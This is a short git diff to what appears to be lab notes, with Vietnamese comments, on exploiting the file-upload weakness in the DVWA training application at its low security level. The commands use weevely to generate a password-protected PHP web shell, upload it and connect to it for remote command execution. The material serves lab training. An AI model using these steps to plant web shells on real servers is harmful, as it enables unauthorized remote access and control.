@@ -103,10 +103,10 @@ Now you can do a RDP connection with the given ip and the Test account which you
 #File Upload
 ```
 low
-weevely generate <pwd> <backdoor>.php
-subl <backdoor>.php	/ nano <backdoor>.php						(kiểm ra ipattacker xem đúng chưa và sau đó upload lên)
+weevely generate <pwd> weevely.php
+subl weevely.php	/ nano weevely.php						(kiểm ra ipattacker xem đúng chưa và sau đó upload lên)
 http://<ipaddr>/dvwa/vulnerabilities/upload/...../hackable/uploads/weevely.php
-weevely http://<ipaddr>/dvwa/hackable/uploads/<backdoor>.php <pwd> 		(sau đó có thể dùng đc cmd/shell)
+weevely http://<ipaddr>/dvwa/hackable/uploads/weevely.php <pwd> 		(sau đó có thể dùng đc cmd/shell)
 ```
 <img width="700" height="300" alt="Screenshot 2026-03-19 at 18 50 57" src="https://github.com/user-attachments/assets/4b16bb5f-392e-490c-a687-655c253bd50c" />
 
